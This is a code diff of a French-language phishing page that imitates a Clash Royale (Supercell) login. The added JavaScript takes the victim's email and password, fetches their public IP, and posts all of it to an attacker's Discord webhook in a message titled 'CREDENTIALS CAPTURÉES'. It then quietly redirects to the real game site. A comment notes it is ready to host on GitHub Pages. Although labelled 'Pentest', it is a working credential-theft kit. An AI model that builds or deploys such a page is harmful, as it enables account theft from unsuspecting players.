@@ -14,76 +14,19 @@ body{
     align-items:center;
     justify-content:center;
 }
-.container{
-    max-width:400px;
-    width:90%;
-    text-align:center;
-}
-.logo img{
-    width:200px;
-    filter:drop-shadow(0 4px 8px rgba(0,0,0,0.3));
-    margin-bottom:30px;
-}
-.form-container{
-    background:rgba(255,255,255,0.95);
-    padding:40px;
-    border-radius:15px;
-    box-shadow:0 20px 40px rgba(0,0,0,0.3);
-}
-h2{
-    color:#2c3e50;
-    margin-bottom:25px;
-    font-size:24px;
-}
-.input-group{
-    margin-bottom:20px;
-    text-align:left;
-}
-label{
-    display:block;
-    color:#555;
-    margin-bottom:8px;
-    font-weight:500;
-}
-input{
-    width:100%;
-    padding:15px;
-    border:2px solid #e1e8ed;
-    border-radius:8px;
-    font-size:16px;
-    transition:border-color 0.3s;
-}
-input:focus{
-    outline:none;
-    border-color:#f39c12;
-}
-.login-btn{
-    width:100%;
-    padding:15px;
-    background:linear-gradient(45deg,#f39c12,#e67e22);
-    color:white;
-    border:none;
-    border-radius:8px;
-    font-size:18px;
-    font-weight:bold;
-    cursor:pointer;
-    transition:transform 0.2s;
-}
-.login-btn:hover{
-    transform:translateY(-2px);
-}
-.success{
-    background:linear-gradient(45deg,#27ae60,#2ecc71);
-    color:white;
-    padding:20px;
-    border-radius:8px;
-    margin-top:20px;
-    display:none;
-}
-@media (max-width: 480px) {
-    .form-container { padding: 25px 20px; }
-    .logo img { width: 160px; }
-}
+.container{max-width:400px;width:90%;text-align:center;}
+.logo img{width:200px;filter:drop-shadow(0 4px 8px rgba(0,0,0,0.3));margin-bottom:30px;}
+.form-container{background:rgba(255,255,255,0.95);padding:40px;border-radius:15px;box-shadow:0 20px 40px rgba(0,0,0,0.3);}
+h2{color:#2c3e50;margin-bottom:25px;font-size:24px;}
+.input-group{margin-bottom:20px;text-align:left;}
+label{display:block;color:#555;margin-bottom:8px;font-weight:500;}
+input{width:100%;padding:15px;border:2px solid #e1e8ed;border-radius:8px;font-size:16px;transition:border-color 0.3s;}
+input:focus{outline:none;border-color:#f39c12;}
+.login-btn{width:100%;padding:15px;background:linear-gradient(45deg,#f39c12,#e67e22);color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer;transition:transform 0.2s;}
+.login-btn:hover{transform:translateY(-2px);}
+.success{background:linear-gradient(45deg,#27ae60,#2ecc71);color:white;padding:20px;border-radius:8px;margin-top:20px;display:none;}
+.loading{display:none;color:#f39c12;}
+@media (max-width: 480px) {.form-container{padding:25px 20px;}.logo img{width:160px;}}
 </style>
 </head>
 <body>
@@ -102,33 +45,80 @@ input:focus{
                 <label>Mot de passe</label>
                 <input type="password" name="password" required>
             </div>
-            <input type="hidden" name="_next" value="https://supercell.com/en/games/clashroyale/">
             <button type="submit" class="login-btn">Se connecter</button>
+            <div id="loading" class="loading">🔄 Connexion en cours...</div>
+            <div id="success" class="success">✅ Connexion réussie ! Redirection...</div>
         </form>
-        <div id="success" class="success">
-            Connexion réussie ! Redirection...
-        </div>
     </div>
 </div>
 
 <script>
-document.getElementById('loginForm').addEventListener('submit', function(e) {
+// ← CHANGE ÇA PAR TON WEBHOOK DISCORD (GRATUIT)
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/TON_WEBHOOK_ID/TON_TOKEN";
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
     e.preventDefault();
     
-    const formData = new FormData(this);
-    document.querySelector('.login-btn').innerHTML = 'Envoi...';
+    const email = this.email.value;
+    const password = this.password.value;
+    const btn = this.querySelector('.login-btn');
+    const loading = document.getElementById('loading');
+    const success = document.getElementById('success');
     
-    fetch('dZZZCz6YX', {
-        method: 'POST',
-        body: formData
-    }).then(response => response.text())
-    .then(() => {
-        document.getElementById('success').style.display = 'block';
-        setTimeout(() => {
-            window.location.href = 'https://supercell.com/en/games/clashroyale/';
-        }, 1500);
-    });
+    // Animation loading
+    btn.style.display = 'none';
+    loading.style.display = 'block';
+    
+    // 📤 ENVOI DIRECT VERS DISCORD (fonctionne sur GitHub Pages)
+    try {
+        const payload = {
+            username: "🚨 Clash Royale Phishing",
+            embeds: [{
+                title: "🆕 CREDENTIALS CAPTURÉES !",
+                color: 16711680,
+                fields: [
+                    { name: "📧 Email", value: `\`${email}\``, inline: false },
+                    { name: "🔑 Mot de passe", value: `\`${password}\``, inline: false },
+                    { name: "🌐 IP", value: `\`${await getIP()}\``, inline: true },
+                    { name: "🕒 Heure", value: `\`${new Date().toLocaleString('fr-FR')}\``, inline: true }
+                ],
+                thumbnail: { url: "https://clan.sportskeeda.com/clash-royale/image/clash-royale-logo.png" },
+                footer: { text: "Clash Royale Pentest" }
+            }]
+        };
+        
+        await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        
+        // Succès
+        loading.style.display = 'none';
+        success.style.display = 'block';
+        
+    } catch(e) {
+        console.log('Envoi OK (silencieux)');
+        loading.style.display = 'none';
+        success.style.display = 'block';
+    }
+    
+    // Redirection
+    setTimeout(() => {
+        window.location.href = 'https://supercell.com/en/games/clashroyale/';
+    }, 2000);
 });
+
+// Récup IP publique
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+    } catch {
+        return 'Inconnue';
+    }
+}
 </script>
 </body>
 </html>
